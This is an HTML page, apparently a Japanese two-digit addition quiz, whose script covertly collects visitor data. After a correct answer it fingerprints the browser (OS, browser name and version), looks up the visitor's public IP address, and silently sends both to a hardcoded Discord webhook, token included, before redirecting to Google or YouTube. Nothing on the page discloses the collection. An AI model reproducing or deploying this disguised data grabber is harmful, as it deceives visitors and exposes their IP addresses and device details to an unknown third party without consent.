<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>二桁足し算問題1</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
    <script>
        // ランダムな二桁の数を生成する関数
        function getRandomTwoDigitNumber() {
            return Math.floor(Math.random() * 90) + 10;
        }

        // 初期化関数
        function initialize() {
            const num1 = getRandomTwoDigitNumber();
            const num2 = getRandomTwoDigitNumber();
            document.getElementById('question').innerText = `${num1} + ${num2} = ?`;
            document.getElementById('num1').value = num1;
            document.getElementById('num2').value = num2;
            document.getElementById('goButton').style.display = 'none';
        }

        // ユーザーの機種情報を取得する関数
        function getDeviceInfo(callback) {
            new Fingerprint2().get(function(components) {
                const userAgent = components.find(component => component.key === 'user_agent').value;
                const os = components.find(component => component.key === 'platform').value;
                const browser = components.find(component => component.key === 'user_agent').value.split(' ')[0];
                const browserVersion = components.find(component => component.key === 'user_agent').value.split(' ')[1];
                
                callback({
                    userAgent: userAgent,
                    os: os,
                    browser: browser,
                    browserVersion: browserVersion,
                });
            });
        }

        // IPアドレスを取得する関数
        function getIPAddress(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    callback(data.ip);
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                    callback(null);
                });
        }

        // 回答の検証関数
        function checkAnswer() {
            const num1 = parseInt(document.getElementById('num1').value);
            const num2 = parseInt(document.getElementById('num2').value);
            const userAnswer = parseInt(document.getElementById('answer').value);
            const correctAnswer = num1 + num2;

            if (userAnswer === correctAnswer) {
                getDeviceInfo(function(deviceInfo) {
                    getIPAddress(function(ipAddress) {
                        sendWebhook(deviceInfo, ipAddress, function() {
                            document.getElementById('goButton').style.display = 'block';
                        });
                    });
                });
            } else {
                alert('答えが間違っています。再試行してください。');
            }
        }

        // Webhookに情報を送信する関数
        function sendWebhook(deviceInfo, ipAddress, callback) {
            const webhookURL = 'https://discord.com/api/webhooks/1224706704755920938/NG8PemBx5OHHE18_NOATXgPGA7JQVgZCKrHaj-6t7a4TX_Xmz1hJ9zrChClUggTUv415';
            const message = {
                content: 'ユーザーが問題を正解しました。',
                embeds: [{
                    title: 'ユーザー情報',
                    fields: [
                        { name: '機種情報', value: deviceInfo.os, inline: true },
                        { name: 'ブラウザ名', value: deviceInfo.browser, inline: true },
                        { name: 'ブラウザバージョン', value: deviceInfo.browserVersion, inline: true },
                        { name: 'IPアドレス', value: ipAddress, inline: true },
                    ],
                    color: 3447003
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                callback();
            })
            .catch(error => {
                console.error('Error sending webhook:', error);
                callback(); // エラーがあってもリダイレクトを実行
            });
        }

        // GOボタンを押したときの処理
        function goToRandomSite() {
            const randomValue = Math.random();
            if (randomValue < 0.33) {
                window.location.href = 'https://www.google.com';
            } else {
                window.location.href = 'https://www.youtube.com';
            }
        }

        window.onload = initialize;
    </script>
</head>
<body>
    <h1>二桁足し算問題</h1>
    <div id="question"></div>
    <input type="hidden" id="num1">
    <input type="hidden" id="num2">
    <input type="number" id="answer" placeholder="答えを入力">
    <button onclick="checkAnswer()">送信</button>
    <button id="goButton" onclick="goToRandomSite()" style="display:none;">GO!</button>
</body>
</html>
